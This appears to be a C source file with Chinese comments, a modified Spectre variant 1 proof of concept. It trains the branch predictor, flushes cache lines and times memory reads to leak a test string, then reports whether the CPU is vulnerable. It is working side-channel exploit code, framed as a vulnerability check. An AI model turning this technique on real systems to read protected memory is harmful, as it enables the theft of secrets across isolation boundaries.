//主要就是j%6==0时，array1[x]为预测地址中的值(0-255)val，则此时，array[val * 512]的值入缓存，读取会快一些

/*
	modify by:CSZQ
*/
/*
	配置
*/
#define __DEBUG			0												// 调试模式开关，会打开额外输出
#define __TRYTIMES		50												// 每个字符尝试读取次数
/*
	测试读取的数据
*/
#define __MAGICWORDS	"1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890"		
#define __MAGICWORDSCOUNT (sizeof(__MAGICWORDS) - 1)				// 测试数据长度
/*
	cache 命中阀值，是一个经验值，不成功9.9可能这里不对，默认值 50 ，可以通过 -t 传参修改
	该数值与内存质量、CPU多项参数有关，是一个经验值，下面给出一些基于本帅移动端的 CPU Intel I7-4700MQ 给出的参数取值
	取值大致范围：16 - 176
*/
#define CACHE_HIT_THRESHOLD (50)
 
 
/*
	头文件
*/
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <intrin.h>
#pragma optimize("gt",on)
 
 
/*
	全局变量
*/
unsigned int array1_size = 16;											// 排除 ASCII 码表前 16 个字符
uint8_t array1[160]      = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };	// 一个字典
uint8_t array2[256 * 512];												// 256 对应 ASCII 码表
const char *secret       = __MAGICWORDS;								// 测试读取的数据
int iThreshold           = CACHE_HIT_THRESHOLD;							// 读取时间阀值
 
 
/*
	使用 temp 全局变量阻止编译器优化 victim_function()
*/
uint8_t temp = 0;
 
void victim_function(size_t x) {
 
	/*
		x 取值 0 - 15 时 获取 arrary2 的 1 - 16 分组 & temp 后赋值给 temp
		temp 一直为 0
		发生 evil 分支预测：
		array1[x] 在 5 次分支预测时加载的值就是当前需要读取的虚拟地址
		array2[array1[x] * 512] 在 5 次分支预测期间读取的是 标准ASCII 0 - 127 * 512 所在地址的 array2 数组内容
		其他分支预测：
		array1[x] cache 中的是根据尝试次数获取到的正常 array1 数组标准值
		array2[array1[x] * 512] 在cache中缓存的是 ASCII 码表 1 - 16 号字符
	*/
	if (x < array1_size) {
		temp &= array2[array1[x] * 512];
	}
}
 
 
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
	static int results[256];											// 对应 ASCII 码表
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t *addr;
 
	for (i = 0; i < 256; i++)
		results[i] = 0;
 
	/*
		每个字符多次尝试获取以增加成功率
	*/
	for (tries = __TRYTIMES; tries > 0; tries--) {
 
		/*
			清空 array2 的每 512 字节首地址 cache
		*/
		for (i = 0; i < 256; i++)
			_mm_clflush(&array2[i * 512]);								// _mm_clflush：Invalidate and flush the cache line that contains p from all levels of the cache hierarchy
 
		training_x = tries % array1_size;
 
		/*
			训练 CPU 缓存需要的数据
		*/
		for (j = 29; j >= 0; j--) {
			_mm_clflush(&array1_size);									// 清空 array1_size 的缓存
 
			/*
				100 次内存取值用作延时，确保 cache 页全部换出
			*/
			for (volatile int z = 0; z < 100; z++) {}
 
			/*
				在这一步:
				j % 6 =  0 则 x = 0xFFFF0000
				j % 6 != 0 则 x = 0x00000000
				Avoid jumps in case those tip off the branch predictor
			*/
			x = ((j % 6) - 1) & ~0xFFFF;
 
			/*
				到这里:
				j % 6 =  0 则 x = 0xFFFFFFFF
				j % 6 != 0 则 x = 0x00000000
			*/
			x = (x | (x >> 16));
 
			/*
				最后:
				j % 6 =  0 则 x = malicious_x
				j % 6 != 0 则 x = training_x
			*/
			x = training_x ^ (x & (malicious_x ^ training_x));
 
			/*
				调用触发 cache 代码
				共计触发 5 次，j = 24、18、12、6、0时，都会触发分支预测
			*/
			victim_function(x);
		}
		/*
			退出此函数时 cache 中已经缓存了需要越权获取的数据
		*/
 
		/*
			读取时间。执行顺序轻微混淆防止 stride prediction（某种分支预测方法）
			i 取值 0 - 255 对应 ASCII 码表
		*/
		for (i = 0; i < 256; i++) {
			/*
				TODO: 贼NB的数学游戏，值得叫 666
				167  0xA7  1010 0111
				13   0x0D  0000 1101
				取值结果为 0 - 255 随机数且不重复
			*/
			mix_i = ((i * 167) + 13) & 255;
 
			/*
				addr 取 arrary2 中 0-255 组的首地址
			*/
			addr = &array2[mix_i * 512];
 
			/*
				junk 保存 TSC_AUX 寄存器值
				time1 保存当前时间戳
			*/
			time1 = __rdtscp(&junk);
 
			/*
				获取数据，用以测试时间
			*/
			junk = *addr;
 
			/*
				记录并获取耗时
			*/
			time2 = __rdtscp(&junk) - time1;
 
			/*
				判断是否命中，且 mix_i 不能取 1 - 16，因为 1 - 16 在获取时是无效的
			*/
			if (time2 <= iThreshold && mix_i != array1[tries % array1_size])
				/*
				cache arrary2中的 0-255 项命中则 +1 分
				*/
				results[mix_i]++;
		}
 
		/*
			获取分组中命中率最高的两个分组，分别存储在 j(最高命中),k（次高命中） 里
		*/
		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j]) {
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k]) {
				k = i;
			}
		}
 
		/*
			最高命中项命中次数大于 2 倍加 5 的次高命中项次数
			或
			仅仅最高命中项命中 2 次
			则
			退出循环，成功找到命中项
		*/
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
 
	/*
		使用 junk 防止优化输出
	*/
	results[0] ^= junk;
	value[0] = (uint8_t)j;//最高命中项
	score[0] = results[j];//最高命中项命中次数
	value[1] = (uint8_t)k;//次高命中项
	score[1] = results[k];//次高命中项命中次数
}
 
 
int main(int argc, const char **argv) {
	size_t malicious_x = (size_t)(secret - (char*)array1); /* 相对地址 */
	int i, score[2], iLen = __MAGICWORDSCOUNT, iCount = 0;
	char *opt;
	uint8_t value[2];
 
	/*
		参数解析
	*/
	if (argc > 1) {
		opt = (char*)&argv[1][1];
		switch (*opt) {
		case 'h':
			printf("-h  help\n-t 设置阀值，建议取值 16 - 176 之间，默认 50\n");
			return 0;
		case 't':
			if (argc==2) {
				sscanf(opt + 1, "%d", &iThreshold);
			} 
			else {
				sscanf(argv[2], "%d", &iThreshold);
			}
			break;
		}
	}
 
	for (i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* 避免写时复制 */
 
#if __DEBUG > 0
	printf("Reading %d bytes:\n", iLen);
#endif
	i = iLen;
	while (--i >= 0) {
 
#if __DEBUG > 0
		printf("读取地址：%p ", (void*)malicious_x);
#endif
 
		readMemoryByte(malicious_x++, value, score);
		char* addr = (char*)array1 + malicious_x - 1;
		if (value[0] == *addr) {
			iCount += (score[0] > 2 * score[1]) ? 1 : 0;
		}
		
#if __DEBUG > 0
		/*
			如果最高命中项命中次数大于等于 2 倍的次高命中项，认为分支预测成功
		*/
		printf("%s: ", (score[0] >= 2 * score[1] ? "成功" : "...."));
		printf("value:0x%02X char=%c counts=%d ", value[0],
			((value[0] > 31 && value[0] < 127) ? (char)value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(可能:value:0x%02X char=%c counts=%d)", value[1], ((value[0] > 31 && value[0] < 127) ? (char)value[0] : '?'), score[1]);
		printf("\n");
#endif
	}
	/*
		命中次数超过 1/5 认为存在BUG，过低有可能是巧合或阀值需要调整
	*/
	printf("%s\r\n", (iCount >= __MAGICWORDSCOUNT / 5) ? "--->存在BUG!<---" : "--->不存在BUG<---");
	printf("%d 阀值下命中率为:%d / %d\r\n", iThreshold, iCount, iLen);
	printf("按任意键退出程序...\r\n");
	getchar();
 
	return (0);
}
